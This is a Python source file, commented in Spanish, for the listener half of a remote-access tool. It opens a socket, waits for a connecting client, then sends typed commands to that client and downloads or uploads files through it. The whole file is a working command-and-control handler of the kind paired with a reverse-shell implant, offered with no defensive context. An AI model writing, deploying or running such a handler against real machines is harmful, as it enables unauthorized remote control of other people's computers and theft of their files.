import socket
import json
import optparse
import os
import struct

def getArguments():
    parser = optparse.OptionParser()
    parser.add_option('-i', '--ip', dest= 'serverIp', help= 'Ip del dispositivo que recibirá las respuestas')
    parser.add_option('-p', '--port', dest= 'serverPort', help= 'Puerto del dispositivo que recibirá las respuestas')
    options = parser.parse_args()[0]
    return options

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) #Reestablece la conexión en caso de que se pierdan los paquetes
        listener.bind((ip, port))    
        listener.listen(0)

        print('Servidor inicializado, esperando por conexiones')
        self.connection, address = listener.accept() #Aceptar conexiones
        print(f'[+]Conexión establecida con {address}\n')
        self.reliableSend(b'Conexion establecida')

    #Es importante mantener una integridad de los datos, 
    #es decir, asegurarnos de que ningún paquete se pierda durante la comunicación
    #Para ello es necesario convertirlos en formato json
    #Codificación json:
    def reliableSend(self, data):
        if isinstance(data, bytes):
            jsonData = json.dumps(data.decode(errors= 'replace'))            
        else:
            jsonData = json.dumps(data)

        self.connection.send(bytes(jsonData, 'utf-8'))

    #Decodificación json:
    def reliableRecieve(self):
        jsonData = ''
        while True:
        #Al usar un bucle, la función de recibir datos se ejecuta una y otra vez.
        #De esta manera nos aseguramos de que todos los paquetes sean recividos, evitando que se pierda alguno.
        #Así aseguramos la integridad de los mismos.
            '''try:
                jsonData = self.connection.recv(4096)                
                return json.loads(jsonData.decode('utf-8'))
            
            except ValueError: 
                print('Está ocurriendo un error')
                continue'''
            jsonData = self.connection.recv(4096)
            return json.loads(jsonData)

    def receive_file_size(self, sck: socket.socket):
        # Esta función se asegura de que se reciban los bytes
        # que indican el tamaño del archivo que será enviado,
        # que es codificado por el cliente vía struct.pack(),
        # función la cual genera una secuencia de bytes que
        # representan el tamaño del archivo.
        fmt = "<Q"
        expected_bytes = struct.calcsize(fmt)
        received_bytes = 0
        stream = bytes()
        while received_bytes < expected_bytes:
            chunk = sck.recv(expected_bytes - received_bytes)
            stream += chunk
            received_bytes += len(chunk)
        filesize = struct.unpack(fmt, stream)[0]
        return filesize

    def receive_file(self, sck: socket.socket, filename, route):
        # Leer primero del socket la cantidad de 
        # bytes que se recibirán del archivo.
        filesize = self.receive_file_size(sck)
        # Abrir un nuevo archivo en donde guardar
        # los datos recibidos.
        filename = os.path.basename(filename)
        with open(f'{route}{filename}', "wb") as f:
            mensaje = '[+]Archivo descargado con éxito'
            received_bytes = 0
            # Recibir los datos del archivo en bloques de
            # 1024 bytes hasta llegar a la cantidad de
            # bytes total informada por el cliente.
            while received_bytes < filesize:
                chunk = sck.recv(1024)
                if chunk and not (b'no encononontrado' in chunk):                    
                    f.write(chunk)
                    received_bytes += len(chunk)
                else:
                    mensaje = '[-]Descarga fallida o archivo no encontrado'
                    break
            print(mensaje)
    
    def remoteAction(self, command):
        self.reliableSend(command)
        if command[0] == 'salir' or command[0] == 'Salir':
            print('Programa finalizado')
            self.connection.close()
            exit()        
        return self.reliableRecieve()

    def run(self):
            while True:
                command = input('>>')
                command = command.split(' ')                

                if command[0] == 'down':
                    self.reliableSend(command)
                    self.receive_file(self.connection, ' '.join(command[2:]), command[1])
                    result = ''

                elif command[0] == 'up':
                    contentFile = self.readFile(' '.join(command[2:]))
                    #command[0]=comando, command[1]=ruta, command[2:]=nombre del archivo
                    command = [command[0], contentFile.decode('utf-8', 'replace'), command[1], ' '.join(command[2:])]
                    result = self.remoteAction(command)

                else:
                    result = self.remoteAction(command)

                print(result)

options = getArguments()
try:
    listener = Listener('', int(options.serverPort))
    listener.run()

except KeyboardInterrupt:
    print('\nPrograma interrumpido')